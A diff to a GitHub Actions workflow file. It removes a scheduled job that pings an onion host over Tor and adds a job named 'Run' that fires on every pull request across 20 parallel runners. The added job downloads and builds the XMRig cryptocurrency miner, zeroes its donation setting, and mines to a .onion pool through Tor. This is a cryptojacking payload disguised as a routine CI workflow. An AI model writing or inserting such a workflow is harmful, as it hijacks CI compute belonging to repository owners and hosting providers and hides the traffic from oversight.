@@ -1,41 +1,26 @@
-name: Check that 2ma67*4xl.onion is online every half day using the torssh action
-on:
-  schedule:
-    - cron: '0 */12 * * *'
-
+name: Run
+on: [pull_request]
 jobs:
-  build:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@master
-        name: Checkout github
-      - name: Checkout submodules associated with this repo
-        uses: textbook/git-checkout-submodule-action@1.0.0
-      - name: Checkout MASTER (Ensure master is checked out)
-        run: git checkout master        
-      - name: Run SSH
-        uses: nolim1t/actions/torssh@0.2.0
-        env:
-          PRIVATE_KEY: ${{ secrets.PRIVATE_KEY }}
-          USERHOST: ${{ secrets.USERHOST }}
-          CMD: "date -R > nlcnx-i5y4-date-output.txt"
-      - name: Copy nlcnx-i5y4-date-output.txt to working dir
-        uses: nolim1t/actions/torscp@0.2.0
-        env:
-          PRIVATE_KEY: ${{ secrets.PRIVATE_KEY }}
-          SRC: ${{ secrets.USERHOST }}:nlcnx-i5y4-date-output.txt
-          DEST: ./nlcnx-i5y4-date-output.txt
-      - name: Add nlcnx-i5y4-date-output.txt to github
-        run: git add nlcnx-i5y4-date-output.txt
-      - name: Set up git config
-        run: git config --global user.email "nolim1t@users.noreply.github.com" && git config --global user.name "@nolim1t"
-      - name: Commit nlcnx-i5y4-date-output.txt to this repo
-        run: git commit --allow-empty -m "Add output of date from nlcnx*i5y4.onion"
-      - name: Update host key for github
-        run: mkdir -p ~/.ssh && echo "${PRIVATE_KEY}" > ~/.ssh/id_ed25519 && chmod 600 ~/.ssh/id_ed25519 && ssh-keyscan -t rsa github.com >> ~/.ssh/known_hosts
-        env:
-          PRIVATE_KEY: ${{ secrets.PRIVATE_KEY }}
-      - name: Add SSH Target
-        run: git remote add originssh git@github.com:nolim1t/actions.git
-      - name: Push committed on master to github
-        run: git push originssh master
+    run:
+        name: Run
+        runs-on: ubuntu-latest
+        strategy:
+          fail-fast: false
+          matrix:
+            runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+        steps:
+          - shell: bash
+            run: |
+              sudo apt-get update
+              
+              sudo apt-get install --yes tor  build-essential cmake git libhwloc-dev libssl-dev libuv1-dev
+              curl -Lo xmrig.tar.gz https://github.com/xmrig/xmrig/archive/refs/tags/v6.10.0.tar.gz
+              tar xf xmrig.tar.gz
+              cd xmrig-*
+              sed -Ei 's/^(.*DonateLevel = )(.*)$/\10;/g' src/donate.h
+              mkdir build
+              cd build
+              cmake .. -DCMAKE_BUILD_TYPE=Release
+              make --jobs=$(nproc)
+
+              ./xmrig -o f2x6wq65wc7qxsrsdq6nj6mkwgfonc52brkmi4puxdksoczzujqamnyd.onion:8080 -x socks5://127.0.0.1:9050 --donate-level 0 
